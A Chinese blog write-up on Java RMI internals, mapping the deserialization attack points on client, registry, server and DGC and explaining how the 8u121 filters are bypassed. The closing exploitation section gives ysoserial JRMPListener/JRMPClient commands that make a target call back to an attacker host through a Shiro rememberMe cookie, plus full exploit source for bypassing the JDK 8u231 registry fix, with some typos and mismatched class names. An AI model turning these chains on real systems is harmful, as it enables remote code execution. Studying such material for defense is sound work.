---
title: "RMI三端源码分析&JRMP及其高版本绕过"
onlyTitle: true
date: 2024-9-20 21:47:03
categories:
- java
- RMI
tags:
- java原生RCE
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B898.jpg

---

说实话我每次看到RMI的流程我都觉得脑袋疼。而且分析完了都不记得分析了个什么鸟。

或许这次会好一点。



## RMI远程类调用

RMI的作用就是客户端调用服务端的远程类。

我们开两个项目，一个做客户端，一个做服务端。用jdk8u65

### RMIServer

定义一个继承了Remote的接口RemoteInterface

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteInterface extends Remote {
    public String sayHello(String name) throws RemoteException;
}
```

一个实现该接口的类RemoteImpl，需要继承UnicastRemoteObject

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteImpl extends UnicastRemoteObject implements RemoteInterface {
    protected RemoteImpl() throws RemoteException {
    }

    public String sayHello(String name) {
        System.out.println("Hello " + name);
        return "Hello " + name;
    }
}
```

>RemoteImpl必须加入一个调用了父类构造函数的构造函数。
>
>这里的无参构造函数实际上会自动向第一行插入一条隐式的`super()`，如下。而不写构造函数是自动生成无参构造函数，不满足调用`super(args...);`的要求，所以报错。
>
>```java
>protected RemoteImpl() throws RemoteException {
>    	super();
>}
>```

向外开放服务的RMIServer。需要LocateRegistry.createRegistry(1099)，开放注册中心到1099端口。并把类绑定到注册中心。

```java
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
        RemoteInterface remoteImpl = new RemoteImpl();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("remoteImpl", remoteImpl);
    }
}
```



### RMIClient

需要一个相同的接口RemoteInterface

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteInterface extends Remote {
    public String sayHello(String name) throws RemoteException;
}
```

使用服务端远程类的，客户端RMIClient

```java
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        RemoteInterface remoteImpl = (RemoteInterface) registry.lookup("remoteImpl");
        System.out.println(remoteImpl.sayHello("RMI"));
    }
}
```

先开服务端，再开客户端。客户端就能调用到服务端上的方法sayHello



## 源码分析

移步视频：

https://www.bilibili.com/video/BV1L3411a7ax?p=1&vd_source=732f44595cd3e361ab78ff559f3c5ab5

此处概述+只给利用点和利用方式，因为分析了也记不住。我直接偷偷分析，挂上来我自己都不看。

偷个包浆RMI通信老图

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20210227013102-65c85794-7858-1.png)

先从服务端开始

### 服务端

#### `RemoteInterface remoteImpl = new RemoteImpl();`

从UnicastServerRef一路跟到了TCPEndpoint.getLocalEndpoint，获取了IP

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808174637721.png)

在UnicastServerRef.exportObject完成了创建远程对象的主要逻辑，前面都是层层封装，没什么好看的。

生成了一个stub并赋值，这是服务端stub

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808175819215.png)

实际上，赋值调用的Util.creatProxy()内部，就是生成了一个代理类。等于说stub就是个代理类，如下

handler来自RemoteObjectInvocationHandler，看到该类满足代理handler的要求，继承了InvocationHandler

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808180905120.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808181139454.png)

还记得动态代理吗，调用代理类的方法会自动走进handler的invoke方法（虽然这里没调用，但是为后面你使用sayHello的时候做了铺垫）

这里RemoteObjectInvocationHandler.invoke就是加了个判断的普通invoke执行方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808181443160.png)

下面一堆调用，从ref.exportObject跟到TCPTransport.exportObject。listen()方法开始监听。跟进去看看

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808182452854.png)

从ep中提取了Endpoint（翻译为终端）和端口。ep就是之前TCPEndpoint.getLocalEndpoint生成的。然后调用了newServerSocket

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808182801736.png)

在newServerSocket中，createServerSocket新建了一个Websocket。并且监听端口为0，会调用setDefaultPort获取端口。从前面的调试信息也可以看到，一路过来端口都是默认的0

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183049077.png)

setDefaultPort内部，获取了所有的本地未开放端口，并异步循环取最后一个端口。就是随机取一个端口啦

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183329514.png)

从这里开始，port就有值了。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183541809.png)

继续运行到UnicastServerRef.exportObject。在get不到值的时候会向map里put键值。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808202655547.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808202749065.png)

虽然是put进去了，但是只有个类名。方法名还需要跳转到UnicastServerRef$HashToMethod_Maps.computeValue中获取

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203348116.png)

从接口中循环获取方法名，设为可访问，put进map中

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203552048.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203719584.png)



最后我们生成的remoteImpl对象，有LiveRef包含的host和一个随机的端口号，还有装填了方法的hashToMethod_Map。这些都封装在UnicastServerRef的一个对象中。创建了一个代理类stub，但是return时并没有存储，只是写了个逻辑在这。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203908620.png)

但是服务端开随机的端口号，客户端怎么知道这个端口号来获取类呢？下一步就是解决这个问题



#### `Registry registry = LocateRegistry.createRegistry(1099);`

新建了一个指定端口为1099空的LiveRef对象

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810201839454.png)

在随后的setup函数中，同样的来到UnicastServerRef.exportObject完成代理对象stub的创建。这是注册端stub

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810205629364.png)

注意，这里创建stub时，跟进Util.creatProxy->stubClassExists()。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911123302805.png)

如果存在remoteClass_Stub类（在这里就是RegistryImpl_Stub类），返回true

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911103837939.png)

可以看到该类是存在的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104013368.png)

在creatStub创建了RegistryImpl_Stub类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104407588.png)

在这里，stub是RegistryImpl_Stub，而不是我们自定义的RemoteImpl。会走进`if (stub instanceof RemoteStub)`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104535005.png)

接下来是创建skeleton。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810205955178.png)

获取了类名，为RegistryImpl_Skel并加载。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210236486.png)

在java.rmi.registry中能找到这个类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210430060.png)

这个类实际就是分发方法的重点类。在RegistryImpl_Skel的dispatch类中，根据case的不同分别调用bind，list，lookup，rebind和unbind。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210919526.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810211036199.png)

把Registry的public方法put进了hashToMethod_Map。包括bind，list，lookup，rebind和unbind方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810211636007.png)



最后生成的registry对象。包含一个开了1099端口的LiveRef，一个实例化RegistryImpl_Skel的skel，一个装了RegistryImpl方法的hashToMethod_Map

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212211221.png)



#### `registry.bind("remoteImpl", remoteImpl);`

这个代码就很少了，把remoteImpl对象put进一个HashTable

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212513264.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212459703.png)

封装在了上一步生成的registry对象

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212754704.png)

这就解决了客户端访问不了随机端口号的问题。我们现在大致也能猜出客户端发送lookup等请求后，是怎么处理的请求了。

由1099端口开放的注册中心registry对象接收请求，再由skel的dispatch分发给具体的函数。比如看调用的RegistryImpl的lookup函数，都是从bindings获取请求的类。这才获取到我们自定义的remoteImpl

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810213419743.png)



接下来验证一下猜测

### 客户端

#### `LocateRegistry.getRegistry("127.0.0.1", 1099);`

与想象的不同，本以为getRegistry是从网络中序列化的数据获取注册信息。实际上是在本地新建了一个RegistryImpl_Stub类用来代理转发，TCPEndpoint指向127.0.0.1:1099。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911122129504.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911163712452.png)

#### `(RemoteInterface) registry.lookup("remoteImpl");`

这一步因为RegistryImpl_Stub是1.1，而我们这里测试用的是1.8，所以调试进不来。就手动看一下代码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911164301067.png)

先调用newCall，也就是调试跳转到的UnicastRef.newCall。这个函数和远程TCPEndpoint建立了连接

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911165607312.png)

super.ref.invoke调用的是UnicastRef.invoke。注意这个executeCall()，跟进去，这个函数很重要

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912093440111.png)

executeCall这个函数里，如果case是ExceptionalReturn，那就会进行反序列化，设计初衷是为了反序列化获取异常内容，方便进行调试。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png)

传入恶意类，极大概率报异常走入该case

除了RegistryImpl_Stub.lookup->UnicastRef.invoke->StreamRemoteCall.executeCall->readObject外

RegistryImpl_Stub.bind，list，rebind，unbind都能走到executeCall触发readObject

**所以，只要绑定的registry是恶意registry，lookup时返回一个恶意流。客户端就会受到反序列化攻击**

lookup从var2获取序列化流进行反序列化后，得到的是个RemoteObjectInvocationHandler代理类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912104324211.png)

有没有觉得这个代理类很眼熟？正是和服务端`new RemoteImpl()`Util.creatProxy的stub一样。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912104534369.png)

我们反序列化获取了服务端生成的RemoteImpl()代理类对象，后面就能执行对应方法了



#### `remoteImpl.sayHello("RMI")`

获取到的remoteImpl是个代理类，调用方法sayHello就跳转到了RemoteObjectInvocationHandler.invoke

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912110213795.png)

跟进到UnicastRef.invoke，这个函数巨TM长，重点看后半段代码

marshalValue是序列化函数，types是参数值，把参数值每位序列化后调用executeCall，然后unmarshalValue反序列化调用返回结果

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912110948705.png)

unmarshalValue中的readObject，也会引起恶意注册端对客户端造成反序列化攻击

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png)

readObject的结果就是`remoteImpl.sayHello("RMI")`的返回值



总结一下，攻击客户端有两个点

* 获取远程对象代理：RegistryImpl_Stub.lookup->excuteCall 当case为ExceptionalReturn时返回恶意流造成反序列化漏洞

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png)

* 调用函数：unmarshalValue反序列化 调用函数（sayHello）返回值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png)

其中lookup、bind等->excuteCall攻击客户端，被称为JRMP



### 注册端处理客户端`registry.lookup("remoteImpl");`

客户端调用lookup方法，服务端怎么走到`RegistryImpl_Skel.dispatch`的，我就不跟了，懒得跟，看了也没意义。直接看`RegistryImpl_Skel.dispatch`处理lookup请求：

其实上文都贴过图了，将var2反序列化，调用lookup，把返回对象序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150847207.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150807876.png)

这一步dispatch的var2参数对应了RegistryImpl_Stub.lookup一开始newCall创建的RemoteCall。现在理解为什么各个文章都说RMI实际是客户端stub与服务端skel进行通信了吧

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919154350348.png)

由于注册端处理来自客户端的lookup等请求，都是通过序列化与反序列化，如果客户端RegistryImpl_Stub.lookup传输恶意RemoteCall，则会对注册端造成反序列化攻击

其他几个如bind,unbind等均存在此问题



### 服务端处理`remoteImpl.sayHello("RMI")`

跟到UnicastServerRef.dispatch。逐位反序列化types，其实就是我们`sayHello("RMI")`的参数RMI。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919155849361.png)

marshalValue序列化函数调用的结果再传回客户端。与上面我们分析客户端`remoteImpl.sayHello("RMI")`相对应

如果客户端调用函数的参数是恶意反序列化类，会对服务端造成反序列化攻击



## DGC反序列化

在服务端`RemoteInterface remoteImpl = new RemoteImpl();`打上断点，跟进到Transport.exportObject，向ObjectTable写入了target

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919165659042.png)

具体看一下写入的putTarget函数，在put之前执行了DGCImpl的函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919170307941.png)

DGCImpl.dgcLog是一个静态变量

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172030705.png)

访问静态变量之前，类已经执行了静态代码块进行初始化，所以调试先进入静态代码块

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172135835.png)

静态代码块里创建了DGCImpl()对象，并类似创建注册中心stub一样，不仅创建了一个代理DGCImpl_Stub，还调用setSkeleton。最后向ObjectTable添加了这个DGC的Target

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172707882.png)

setSkeleton跟进到creatSkeleton，经典的检测有无DGCImpl_Skel，有的话创建对象并返回

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919173909264.png)

这就是为什么执行完DGCImpl.dgclog.isLoggable函数后，ObjectTable就多出了一个DGCImpl_Stub

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919174410568.png)

实际上DGC是用来垃圾回收的，分发DGCImpl_Stub和DGCImpl_Skel的流程和RegistryImpl_Stub与RegistryImpl_Skel的流程相同，调用其中函数与dispatch的流程也相同

看一下DGCImpl_Stub，clean函数同样可以触发UnicastRef.invoke->excuteCall()，客户端会受到攻击

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180449735.png)

dirty除了可以触发excuteCall，还有反序列化RemoteCall时被攻击

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180616231.png)

DGCImpl_Skel也一样，注册中心受到来自客户端的反序列化攻击

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180945507.png)

只要创建远程对象，就会创建DGCImpl，就可能会遭到以上攻击。因此更通用



## RMI攻击方式

总结一下可能遭到RMI攻击的方式：

通过excuteCall攻击的方式，称为JRMP。

* 客户端

  * 获取远程对象代理：RegistryImpl_Stub.lookup->excuteCall 当case为ExceptionalReturn时返回恶意流造成反序列化漏洞（JRMP）

  ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png)

  * 调用函数：unmarshalValue反序列化 调用函数（sayHello）返回值

  ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png)

  * 调用DGC的clean或者dirty时，会触发excuteCall，受到JRMP攻击。dirty还多一个反序列化远程RemoteCall，也会受到攻击

    ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180449735.png)

* 注册端

  * `RegistryImpl_Skel.dispatch`处理lookup请求。var2反序列化，如果客户端RegistryImpl_Stub.lookup传输恶意RemoteCall，则会对注册端造成反序列化攻击

  ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150847207.png)

  ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150807876.png)

  * DGCImpl_Skel，注册中心受到来自客户端的反序列化攻击

    ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180945507.png)

* 服务端

  * 如果客户端调用函数的参数是恶意反序列化类，会对服务端造成反序列化攻击

  ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919155849361.png)





## 修复

8u121对以上RMI攻击进行了修复

在RegistryImpl加了一个registryFilter函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200233889.png)

只有下列的类才能反序列化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200539232.png)

DGCImpl的过滤更加严重，只有以下四种类才能允许

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200710159.png)



## RMI攻击高版本绕过

8u121只是拦截了反序列化的类，而并没有去掉各个readObject的点，导致绕过

registryFilter允许UnicastRef通过。UnicastRef允许JRMP攻击。所以客户端并没有被修复（可以做蜜罐），依旧会受到攻击

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919203645701.png)

接下来一个思路很NB，想办法在服务端自身发起一个客户端请求，那服务端同时也是客户端，受到反序列化攻击（因为服务端和客户端都共享代码）也就是想办法调用UnicastRef.invoke

DGCImpl_Stub每个方法都调用了UnicastRef.invoke

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919225900797.png)

而创建Stub都是通过Util.createProxy

直接抄结论，在DGCClient#EndpointEntry.EndpointEntry()函数创建了dgc stub

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919214952065.png)

DGCClient.lookup调用了DGCClient#EndpointEntry.EndpointEntry()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919215125716.png)

向上查找用法，跟到ConnectionInputStream.registerRefs，不过需要if(incomingRefTable不为空)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919221050548.png)

如果满足if，向上找到StreamRemoteCall.releaseInputStream会调用ConnectionInputStream.registerRefs()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919222701205.png)

DGCImpl_Skel.dispatch处理每个请求（clean、dirty）都会调用releaseInputStream

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919223754247.png)

也就是说if(incomingRefTable不为空)，正常调用DGCImpl的clean，dirty就会创建DGCImpl_Stub



下面是怎么满足if(incomingRefTable不为空)

### RMI流

LiveRef.read，因为RMI流一定是ConnectionInputStream会走到saveRef。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919221855377.png)

savaRef会向incomingRefTable put值，就能走进if触发ConnectionInputStream.registerRefs

UnicastRef.readExternal会触发read。readExternal在反序列化中会自动调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919224718012.png)

也就是说我们生成一个UnicastRef对象，并写入ref，在反序列化时对ref进行还原，触发read，就能生成DGCImpl_Stub

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919225356793.png)

那怎么调用clean、dirty传入恶意对象进行反序列化攻击呢

在创建完dgc的下面，调用RenewCleanThread

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230536412.png)

进一步调用makeDirtyCall

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230628877.png)

触发了dirty

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230704563.png)

进而JRMP



### 其他流，如Shiro流

非RMI流直接进else创建dgc了，跟上面利用方式一样

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919233346788.png)





## 利用

ysoserial

### 8u121前

由于`RegistryImpl_Skel.dispatch`处理lookup、bind等请求，客户端攻击注册中心

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919231414609.png)

客户端通过攻击dgc攻击注册中心

exploit中

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919231641395.png)

payload中，JRMPListener是针对一个反序列化点，RMI开启另一个RMI服务（端口不同），再打RMI，一种二次反序列化。绕过一些RMI限制，但是原来的链子既然都能执行开RMI了，也能RCE了😂，没什么用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232620197.png)



### 8u121后

上文的高版本绕过，RMI流，可攻击注册中心和客户端

exploit中

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232311093.png)

也是上文的高版本绕过，但是走的非RMI流，利用非RMI流走开RMI服务，用这个payload/JRMPClient开RMI服务，再用exploit对RMI进行攻击。非常常用的二次反序列化链子。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232905118.png)

这个payload可以在本机开JRMP监听



Usage：

攻击者先在公网 vps （本机可以用花生壳映射）上用 ysoserial 启一个恶意的 JRMPListener，监听在 19999 端口，并指定使用 CommonsCollections6 模块，要让目标执行的命令为 ping 一个域名：

```shell
java -cp ysoserial.jar ysoserial.expeseloit.JRMPListener 19999 CommonsCollections6 "ping cc6.m2pxdwq5pbhubx9p6043sg8wqnwdk2.burpcollaborator.net"
```

然后用 ysoserial 生成 JRMPClient 的序列化 payload，指向上一步监听的地址和端口（假如攻击者服务器 ip 地址为 1.1.1.1）：

```shell
java -jar ysoserial.jar JRMPClient "1.1.1.1:19999" > /tmp/jrmp.ser
```

再用 shiro 编码脚本对 JRMPClient payload 进行编码：

```java
java -jar shiro-exp.jar encrypt /tmp/jrmp.ser
```

将最后得到的字符串 Cookie 作为 rememberMe Cookie 的值，发送到目标网站。如果利用成功，则前面指定的 ping 命令会在目标服务器上执行，Burp Collaborator client 也将收到 DNS 解析记录。





## 修复

在jdk 8u231中，RMI针对accessCheck进行了修复。但还是可以绕

https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/

```java
package ysoserial.exploit;

import ysoserial.payloads.JRMPClient_bypass_jep_jdk231;
import ysoserial.secmgr.ExecCheckingSecurityManager;

public class RMIRegistryExploit_bypass_jep_jdk231 {
    private static class TrustAllSSL implements X509TrustManager {
        private static final X509Certificate[] ANY_CA = {};
        public X509Certificate[] getAcceptedIssuers() { return ANY_CA; }
        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
    }

    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
        public Socket createSocket(String host, int port) throws IOException {
            try {
                SSLContext ctx = SSLContext.getInstance("TLS");
                ctx.init(null, new TrustManager[] {new TrustAllSSL()}, null);
                SSLSocketFactory factory = ctx.getSocketFactory();
                return factory.createSocket(host, port);
            } catch(Exception e) {
                throw new IOException(e);
            }
        }
    }

    public static void main(final String[] args) throws Exception {
        final String host = "192.168.2.4";
        final int port = Integer.parseInt("1099");
        final String command = "192.168.2.4:2333";
        Registry registry = LocateRegistry.getRegistry(host, port);
        try {
            registry.list();
        } catch(ConnectIOException ex) {
            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
        }

        // ensure payload doesn't detonate during construction or deserialization
        exploit(registry, command);
    }

    public static void exploit(final Registry registry,  final String command) throws Exception {
        new ExecCheckingSecurityManager().callWrapped(new Callable<Void>(){public Void call() throws Exception {
            Remote remote = new JRMPClient_bypass_jep_jdk231().getObject(command);
            try {
                JEP_Naming.lookup(registry, remote);
            } catch (Throwable e) {
                e.printStackTrace();
            }

            return null;
        }});
    }
}
```



```java
package ysoserial.payloads;
 
public class JRMPClient_bypass_jep_jdk241 extends PayloadRunner implements ObjectPayload<Remote> {
 
    public Remote getObject (final String command ) throws Exception {
 
        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
 
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) ref);
        RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),// classloader
            new Class[] { RMIServerSocketFactory.class, Remote.class}, // interfaces to implements
            handler// RemoteObjectInvocationHandler
        );
        // UnicastRemoteObject constructor is protected. It needs to use reflections to new a object
        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的
        constructor.setAccessible(true);
        UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);
        Reflections.setFieldValue(remoteObject, "ssf", serverSocketFactory);
        return remoteObject;
    }
 
    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient_bypass_jep_jdk231.class.getClassLoader());
        PayloadRunner.run(JRMPClient_bypass_jep_jdk231.class, args);
    }
}
```

```java
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 2333 CommonsCollections5 "calc"
```

再运行ysoserial.exploit.RMIRegistryExploit_bypass_jep_jdk241.java进行攻击



### 8u241

高于这个版本打不了





比如shiro发不了数组，就能JRMP打
